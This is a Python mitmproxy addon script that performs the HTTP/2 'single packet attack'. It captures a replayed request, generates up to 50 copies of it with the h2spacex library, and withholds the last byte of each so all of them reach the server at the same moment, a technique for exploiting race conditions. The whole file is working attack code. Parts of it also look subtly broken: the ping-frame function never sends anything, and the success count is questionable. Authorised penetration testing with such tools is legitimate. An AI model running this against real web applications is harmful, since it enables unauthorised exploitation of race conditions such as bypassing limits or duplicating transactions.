"""
Script for mitm-proxy, to perfom the single packet attack
"""

import mitmproxy.http
from mitmproxy import ctx
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import logger


class SinglePacketAttackAddonV1:

    def __init__(self):
        logger.be_silent_key = True
        self.host = None
        self.port = 443
        self.h2_conn = None

    def request(self, flow: mitmproxy.http.HTTPFlow):
        if flow.is_replay == "request":
            self.host = flow.request.host
            self.setup_connection()
            self.perform_attack(flow)

    def setup_connection(self):
        self.h2_conn = H2OnTlsConnection(
            hostname=self.host,
            port_number=self.port
        )
        self.h2_conn.setup_connection()

    def perform_attack(self, flow):
        headers = self.format_headers(flow.request.headers)
        body = flow.request.content.decode()
        path = flow.request.path

        # Check if the 'try-num' header is present. If not defaults to 50
        try_num = int(flow.request.headers.get('try-num', '50'))

        stream_ids_list = self.h2_conn.generate_stream_ids(number_of_streams=try_num)
        all_headers_frames = []
        all_data_frames = []
        for i in range(try_num):
            header_frames_without_last_byte, last_data_frame_with_last_byte = self.h2_conn.create_single_packet_http2_post_request_frames(
                method='POST',
                headers_string=headers,
                scheme='https',
                stream_id=stream_ids_list[i],
                authority=self.host,
                body=body,
                path=path
            )
            all_headers_frames.append(header_frames_without_last_byte)
            all_data_frames.append(last_data_frame_with_last_byte)

        temp_headers_bytes = b''.join(bytes(h) for h in all_headers_frames)
        temp_data_bytes = b''.join(bytes(d) for d in all_data_frames)
        self.h2_conn.send_bytes(temp_headers_bytes)
        sleep(0.1)
        self.send_ping_frame()
        self.h2_conn.send_bytes(temp_data_bytes)
        resp = self.h2_conn.read_response_from_socket(_timeout=3)

        # Count successful responses
        success_count = sum(1 for frame in resp if frame.startswith(b'\x00\x00\x00\x01'))

        ctx.log.info(f"Attack completed for {self.host}{path}. Successful responses: {success_count}/{try_num}")

    def format_headers(self, headers):
        return "\n".join(f"{k}: {v}" for k, v in headers.items())

    def send_ping_frame(self, ping_data=b'\x00' * 8):
        if isinstance(ping_data, str):
            ping_data = ping_data.encode()

    def done(self):
        if self.h2_conn:
            self.h2_conn.close_connection()

addons = [SinglePacketAttackAddonV1()]

